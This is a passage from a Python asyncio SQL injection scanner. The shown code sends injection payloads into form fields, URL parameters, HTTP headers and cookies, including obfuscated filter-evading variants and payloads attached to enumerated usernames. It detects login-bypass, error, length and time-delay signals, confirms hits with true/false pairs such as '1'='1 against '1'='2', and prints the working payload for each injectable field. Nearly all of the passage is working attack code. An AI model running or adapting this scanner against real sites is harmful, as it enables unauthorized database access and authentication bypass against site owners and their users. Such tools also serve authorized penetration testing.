                    session, f["method"], f["action"], data=data, timeout=timeout
                )
                return st, tx, dt, data

            async def baseline_for_get(u, p):
                benign_url = build_url_with_params(u, {p: "a"})
                st, tx, dt, ck, err = await fetch(
                    session, "GET", benign_url, timeout=timeout
                )
                return st, tx, dt, benign_url

            for pg, f in forms:
                st, tx, dt, data = await baseline_for_form(f)
                if st < 0:
                    continue
                L0 = len(tx or "")
                evalf = make_eval(
                    st,
                    tx,
                    L0,
                    has_fail_marker(tx),
                    has_success_marker(tx),
                    TIME_THRESHOLD,
                    LEN_RATIO,
                )
                user_field_name = detect_user_field(f["fields"])
                for name, _typ in f["fields"]:
                    baselines.append(
                        ("FORM", f, name, (st, tx, dt), data, evalf, user_field_name)
                    )
                if probe_headers:
                    for hn in HEADER_NAMES:
                        baselines.append(
                            (
                                "FORM_HDR",
                                f,
                                hn,
                                (st, tx, dt),
                                data,
                                evalf,
                                user_field_name,
                            )
                        )
                if probe_cookies:
                    baselines.append(
                        (
                            "FORM_CK",
                            f,
                            "__cookie__",
                            (st, tx, dt),
                            data,
                            evalf,
                            user_field_name,
                        )
                    )

            for u, p in get_cands:
                st, tx, dt, benign_url = await baseline_for_get(u, p)
                if st < 0:
                    continue
                L0 = len(tx or "")
                evalf = make_eval(
                    st,
                    tx,
                    L0,
                    has_fail_marker(tx),
                    has_success_marker(tx),
                    TIME_THRESHOLD,
                    LEN_RATIO,
                )
                baselines.append(
                    ("GET", (u, p), p, (st, tx, dt), benign_url, evalf, None)
                )
                if probe_headers:
                    baselines.append(
                        (
                            "GET_HDR",
                            (u, p),
                            "__headers__",
                            (st, tx, dt),
                            benign_url,
                            evalf,
                            None,
                        )
                    )
                if probe_cookies:
                    baselines.append(
                        (
                            "GET_CK",
                            (u, p),
                            "__cookie__",
                            (st, tx, dt),
                            benign_url,
                            evalf,
                            None,
                        )
                    )

            payloads = build_payloads(risk, allow_or=allow_or)
            normal_payloads = payloads["normal"]
            time_payloads = payloads["time"]

            def combine_username_with_payload(username: str, base_payload: str) -> str:
                if base_payload and base_payload[0] in ("'", '"'):
                    return username + base_payload
                return f"{username} {base_payload}"

            def summarize_evidence(evidence: str) -> str:
                # pick a single, most useful token
                for key in ["db-error", "auth-marker-flip", "delay", "Δlen"]:
                    m = re.search(rf"({key}[^\s,;]*)", evidence)
                    if m:
                        return m.group(1)
                return evidence.split(",")[0].strip() if evidence else ""

            live_seen = set()

            def print_live_hit(h):
                global HITS_HEADER_PRINTED, LIVE_HITS
                if not HITS_HEADER_PRINTED:
                    _println("[hits] live signals:")
                    HITS_HEADER_PRINTED = True
                # location
                if h.lane.startswith("FORM"):
                    path = urlparse(h.where["action"]).path or "/"
                    method = h.where["method"]
                elif h.lane.startswith("GET"):
                    (u, p) = h.where
                    path = urlparse(u).path or "/"
                    method = "GET"
                else:
                    path = "?"
                    method = "?"
                who = f" user={h.enum_user}" if h.enum_user else ""
                ev = summarize_evidence(h.evidence)
                sample = h.variant_payload.strip()
                if len(sample) > 160:
                    sample = sample[:157] + "..."
                _println(
                    f"[hit] {method} {path} field={h.field}{who} | {ev} | payload: {sample}"
                )
                LIVE_HITS += 1  # ticker will show updated count

            async def do_probe(
                lane,
                where,
                field,
                base_info,
                benign,
                evalf,
                base_payload,
                time_sensitive,
                *,
                obfuscate_variant: bool,
                enum_user: Optional[str],
                user_field_name: Optional[str],
            ):
                if _SHUTDOWN:
                    return None
                variant = (
                    obfuscate_payload(base_payload)
                    if obfuscate_variant
                    else base_payload
                )

                headers = None
                cookies = None
                method = "GET"
                url_to_hit = None
                data = None

                if lane == "FORM":
                    f = where
                    data = dict(benign)
                    if enum_user and user_field_name:
                        data[user_field_name] = enum_user
                    if enum_user and user_field_name and field == user_field_name:
                        data[field] = combine_username_with_payload(enum_user, variant)
                    else:
                        data[field] = variant
                    method = f["method"]
                    url_to_hit = f["action"]

                elif lane == "GET":
                    (u, p) = where
                    url_to_hit = build_url_with_params(
                        benign if isinstance(benign, str) else u, {field: variant}
                    )

                elif lane in ("FORM_HDR", "GET_HDR"):
                    headers = {hn: "a" for hn in HEADER_NAMES}
                    if lane == "FORM_HDR":
                        f = where
                        data = dict(benign)
                        if enum_user and user_field_name:
                            data[user_field_name] = enum_user
                        method = f["method"]
                        url_to_hit = f["action"]
                    else:
                        (u, p) = where
                        url_to_hit = build_url_with_params(
                            benign if isinstance(benign, str) else u, {p: "a"}
                        )
                    hn = (
                        field if field != "__headers__" else random.choice(HEADER_NAMES)
                    )
                    headers[hn] = variant

                elif lane in ("FORM_CK", "GET_CK"):
                    cookies = {"probe": "a"}
                    if lane == "FORM_CK":
                        f = where
                        data = dict(benign)
                        if enum_user and user_field_name:
                            data[user_field_name] = enum_user
                        method = f["method"]
                        url_to_hit = f["action"]
                    else:
                        (u, p) = where
                        url_to_hit = build_url_with_params(
                            benign if isinstance(benign, str) else u, {p: "a"}
                        )
                    cookies["probe"] = variant
                else:
                    return None

                st, tx, dt, _ck, err = await fetch(
                    session,
                    method,
                    url_to_hit,
                    data=data,
                    timeout=(time_timeout if time_sensitive else timeout),
                    headers=headers,
                    cookies=cookies,
                )
                if err:
                    return None
                is_interesting, evidence, bypass, L = evalf(
                    st, tx, dt, time_sensitive=time_sensitive
                )
                if is_interesting:
                    shown_variant = (
                        combine_username_with_payload(enum_user, variant)
                        if (
                            lane == "FORM"
                            and enum_user
                            and user_field_name
                            and field == user_field_name
                        )
                        else variant
                    )
                    hit = Hit(
                        lane=lane,
                        where=where,
                        field=field,
                        sink=None,
                        base_payload=base_payload,
                        variant_payload=shown_variant,
                        time_sensitive=time_sensitive,
                        evidence=evidence,
                        dt=dt,
                        L=L,
                        enum_user=enum_user,
                        user_field_name=user_field_name,
                    )
                    key = (id(hit.where), hit.field, hit.variant_payload, hit.enum_user)
                    if key not in live_seen:
                        live_seen.add(key)
                        print_live_hit(hit)
                    return hit
                return None

            # ---- run rounds with variants ----
            hits = []
            total_err = 0
            total_sent_normal = 0
            total_sent_time = 0

            try:
                enum_space = enum_users if enum_users else [None]

                for rd in range(rounds):
                    if _SHUTDOWN:
                        break
                    normal_tasks: List[Callable[[], Any]] = []
                    time_tasks: List[Callable[[], Any]] = []

                    for (
                        lane,
                        where,
                        field,
                        base_info,
                        benign,
                        evalf,
                        user_field_name,
                    ) in baselines:
                        for enum_user in enum_space:
                            for bp in normal_payloads:
                                normal_tasks.append(
                                    partial(
                                        do_probe,
                                        lane,
                                        where,
                                        field,
                                        base_info,
                                        benign,
                                        evalf,
                                        bp,
                                        False,
                                        obfuscate_variant=False,
                                        enum_user=enum_user,
                                        user_field_name=user_field_name,
                                    )
                                )
                                for _ in range(max(0, variants - 1)):
                                    normal_tasks.append(
                                        partial(
                                            do_probe,
                                            lane,
                                            where,
                                            field,
                                            base_info,
                                            benign,
                                            evalf,
                                            bp,
                                            False,
                                            obfuscate_variant=True,
                                            enum_user=enum_user,
                                            user_field_name=user_field_name,
                                        )
                                    )
                            for tp in time_payloads:
                                tvar = 1 if risk == 1 else variants
                                time_tasks.append(
                                    partial(
                                        do_probe,
                                        lane,
                                        where,
                                        field,
                                        base_info,
                                        benign,
                                        evalf,
                                        tp,
                                        True,
                                        obfuscate_variant=False,
                                        enum_user=enum_user,
                                        user_field_name=user_field_name,
                                    )
                                )
                                for _ in range(max(0, tvar - 1)):
                                    time_tasks.append(
                                        partial(
                                            do_probe,
                                            lane,
                                            where,
                                            field,
                                            base_info,
                                            benign,
                                            evalf,
                                            tp,
                                            True,
                                            obfuscate_variant=True,
                                            enum_user=enum_user,
                                            user_field_name=user_field_name,
                                        )
                                    )

                    nr, e1 = await run_pool(session, normal_tasks, concurrency=threads)
                    tr, e2 = await run_pool(
                        session, time_tasks, concurrency=time_threads
                    )
                    total_err += e1 + e2
                    hits.extend([h for h in (nr + tr) if h])

                    total_sent_normal += len(normal_tasks)
                    total_sent_time += len(time_tasks)

                    elapsed = time.perf_counter() - scan_start
                    _println(
                        f"[run] {len(normal_tasks)} req (hits:{sum(1 for x in nr if x)}, err:{e1})   "
                        f"[time] {len(time_tasks)} req (hits:{sum(1 for x in tr if x)}, err:{e2}) | "
                        f"elapsed {elapsed:.1f}s | total requests sent {REQ_SENT}"
                    )

            except KeyboardInterrupt:
                _SHUTDOWN = True
            finally:
                _SHUTDOWN = True
                try:
                    await ticker_task
                except Exception:
                    pass

            # Totals & duration (even if no hits)
            scan_dur = time.perf_counter() - scan_start
            grand_total = total_sent_normal + total_sent_time
            print(
                f"[*] Done in {scan_dur:.1f}s. Requests: {grand_total} (normal:{total_sent_normal}, time:{total_sent_time}), errors: {total_err}"
            )

            if not hits:
                print("[=] No obvious SQLi signals.")
                return

            # ---- Confirm hits (strict rules, preserving username context) ----
            print("\n[*] Confirming hits...")
            uniq = {}
            for h in hits:
                key = (h.lane, id(h.where), h.field, h.variant_payload, h.enum_user)
                if key not in uniq:
                    uniq[key] = h
            hits = list(uniq.values())

            def mk_eval(st, tx):
                return make_eval(
                    st,
                    tx,
                    len(tx or ""),
                    has_fail_marker(tx),
                    has_success_marker(tx),
                    TIME_THRESHOLD,
                    LEN_RATIO,
                )

            async def confirm_one(hit: Hit):
                if hit.lane in ("FORM", "FORM_HDR", "FORM_CK"):
                    f = hit.where
                    data = {name: make_benign_value(name) for name, _ in f["fields"]}
                    if hit.enum_user and hit.user_field_name:
                        data[hit.user_field_name] = hit.enum_user

                    st0, tx0, dt0, _ck, err = await fetch(
                        session, f["method"], f["action"], data=data, timeout=timeout
                    )
                    if st0 < 0:
                        return False
                    evalf = mk_eval(st0, tx0)

                    headers = None
                    cookies = None
                    d_true = dict(data)
                    if hit.lane == "FORM":
                        d_true[hit.field] = hit.variant_payload
                    elif hit.lane == "FORM_HDR":
                        headers = {hn: "a" for hn in HEADER_NAMES}
                        hn = (
                            hit.field
                            if hit.field != "__headers__"
                            else random.choice(HEADER_NAMES)
                        )
                        headers[hn] = hit.variant_payload
                    else:
                        cookies = {"probe": hit.variant_payload}

                    stT, txT, dtT, _ck, err = await fetch(
                        session,
                        f["method"],
                        f["action"],
                        data=d_true,
                        headers=headers,
                        cookies=cookies,
                        timeout=timeout,
                    )
                    if err:
                        return False
                    interestingT, evT, byT, LT = evalf(
                        stT, txT, dtT, time_sensitive=hit.time_sensitive
                    )

                    base = hit.base_payload.lower()
                    false_cand = None
                    if not hit.time_sensitive:
                        if "1==1" in base:
                            false_cand = hit.base_payload.replace("1==1", "1==2")
                        elif "1=1" in base:
                            false_cand = hit.base_payload.replace("1=1", "1=2")
                        elif "'1'='1" in base:
                            false_cand = hit.base_payload.replace("'1'='1", "'1'='2")
                        elif " and " in base:
                            false_cand = re.sub(
                                r"(?i)and\s+1\s*=\s*1", "AND 1=2", hit.base_payload
                            )

                    if false_cand:
                        false_variant = obfuscate_payload(false_cand)
                        headers = None
                        cookies = None
                        d_false = dict(data)
                        if hit.lane == "FORM":
                            if (
                                hit.enum_user
                                and hit.user_field_name
                                and hit.field == hit.user_field_name
                                and false_variant
                                and false_variant[0] in ("'", '"')
                            ):
                                d_false[hit.field] = hit.enum_user + false_variant
                            else:
                                d_false[hit.field] = false_variant
                        elif hit.lane == "FORM_HDR":
                            headers = {hn: "a" for hn in HEADER_NAMES}
                            hn = (
                                hit.field
                                if hit.field != "__headers__"
                                else random.choice(HEADER_NAMES)
                            )
                            headers[hn] = false_variant
                        else:
                            cookies = {"probe": false_variant}

                        stF, txF, dtF, _ck, err = await fetch(
                            session,
                            f["method"],
                            f["action"],
                            data=d_false,
                            headers=headers,
                            cookies=cookies,
                            timeout=timeout,
                        )
                        if err:
                            return False
                        interestingF, evF, byF, LF = evalf(
                            stF, txF, dtF, time_sensitive=False
                        )
                        if interestingT and not interestingF:
                            hit.confirm_ok = True
                            return True
                        return False
                    else:
                        if interestingT and any(
                            k in evT
                            for k in [
                                "status",
                                "db-error",
                                "auth-marker",
                                "Δlen",
                                "delay",
                            ]
                        ):
                            hit.confirm_ok = True
                            return True
                        return False

                else:
                    (u, p) = hit.where
                    benign_url = build_url_with_params(u, {p: "a"})
                    st0, tx0, dt0, _ck, err = await fetch(
                        session, "GET", benign_url, timeout=timeout
                    )
                    if st0 < 0:
                        return False
                    evalf = mk_eval(st0, tx0)

                    headers = None
                    cookies = None
                    if hit.lane == "GET":
                        crafted = build_url_with_params(u, {p: hit.variant_payload})
                    elif hit.lane == "GET_HDR":
                        crafted = benign_url
                        headers = {hn: "a" for hn in HEADER_NAMES}
                        hn = (
                            hit.field
                            if hit.field != "__headers__"
                            else random.choice(HEADER_NAMES)
                        )
                        headers[hn] = hit.variant_payload
                    else:
                        crafted = benign_url
                        cookies = {"probe": hit.variant_payload}

                    stT, txT, dtT, _ck, err = await fetch(
                        session,
                        "GET",
                        crafted,
                        headers=headers,
                        cookies=cookies,
                        timeout=timeout,
                    )
                    if err:
                        return False
                    interestingT, evT, byT, LT = evalf(
                        stT, txT, dtT, time_sensitive=hit.time_sensitive
                    )

                    base = hit.base_payload.lower()
                    false_cand = None
                    if not hit.time_sensitive:
                        if "1==1" in base:
                            false_cand = hit.base_payload.replace("1==1", "1==2")
                        elif "1=1" in base:
                            false_cand = hit.base_payload.replace("1=1", "1=2")
                        elif "'1'='1" in base:
                            false_cand = hit.base_payload.replace("'1'='1", "'1'='2")
                        elif " and " in base:
                            false_cand = re.sub(
                                r"(?i)and\s+1\s*=\s*1", "AND 1=2", hit.base_payload
                            )

                    if false_cand:
                        false_variant = obfuscate_payload(false_cand)
                        headers = None
                        cookies = None
                        if hit.lane == "GET":
                            craftedF = build_url_with_params(u, {p: false_variant})
                        elif hit.lane == "GET_HDR":
                            craftedF = benign_url
                            headers = {hn: "a" for hn in HEADER_NAMES}
                            hn = (
                                hit.field
                                if hit.field != "__headers__"
                                else random.choice(HEADER_NAMES)
                            )
                            headers[hn] = false_variant
                        else:
                            craftedF = benign_url
                            cookies = {"probe": false_variant}

                        stF, txF, dtF, _ck, err = await fetch(
                            session,
                            "GET",
                            craftedF,
                            headers=headers,
                            cookies=cookies,
                            timeout=timeout,
                        )
                        if err:
                            return False
                        interestingF, evF, byF, LF = evalf(
                            stF, txF, dtF, time_sensitive=False
                        )
                        if interestingT and not interestingF:
                            hit.confirm_ok = True
                            return True
                        return False
                    else:
                        if interestingT and any(
                            k in evT
                            for k in [
                                "status",
                                "db-error",
                                "auth-marker",
                                "Δlen",
                                "delay",
                            ]
                        ):
                            hit.confirm_ok = True
                            return True
                        return False

            t0 = time.perf_counter()
            _res, _errs = await run_pool(
                session,
                [partial(confirm_one, h) for h in hits for _ in range(confirm)],
                concurrency=8,
            )
            conf_dur = time.perf_counter() - t0
            elapsed = time.perf_counter() - scan_start

            confirmed = [h for h in hits if h.confirm_ok]
            print(f"[*] Confirm stage took {conf_dur:.1f}s | elapsed {elapsed:.1f}s.")
            if not confirmed:
                print("[=] No obvious SQLi signals.")
                return

            print("\n=== Findings (concise) ===")
            shown = set()
            for h in confirmed:
                if h.lane.startswith("FORM"):
                    where_str = f"{h.where['method']} {h.where['action']}"
                elif h.lane.startswith("GET"):
                    (u, p) = h.where
                    where_str = f"GET {u}"
                else:
                    where_str = "?"

                if h.lane.endswith("_HDR"):
                    sink_desc = " (via header)"
                elif h.lane.endswith("_CK"):
                    sink_desc = " (via cookie)"
                else:
                    sink_desc = ""

                kind = (
                    "time-based"
                    if h.time_sensitive
                    else (
                        "boolean-blind"
                        if (
                            "1=1" in h.base_payload
                            or "1==1" in h.base_payload
                            or "'1'='1" in h.base_payload.lower()
                        )
                        else "basic"
                    )
                )
                key = (where_str, h.field, h.lane, kind, h.enum_user)
                if key in shown:
                    continue
                shown.add(key)

                via = (
                    "via obfuscated variant"
                    if h.variant_payload != h.base_payload
                    else ""
                )
                ex_payload = h.variant_payload.strip()
                who = f" [user:{h.enum_user}]" if h.enum_user else ""
                extra = summarize_evidence(h.evidence)

                print(
                    f"- {kind:<13} at {where_str}{sink_desc} field '{h.field}'{who}: {extra} – payload: {ex_payload} {('('+via+')' if via else '')}"
                )
            print("==========================")

    except KeyboardInterrupt:
        _SHUTDOWN = True
        elapsed = time.perf_counter() - scan_start
        _println(f"[!] Interrupted by user. Elapsed: {elapsed:.1f}s")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
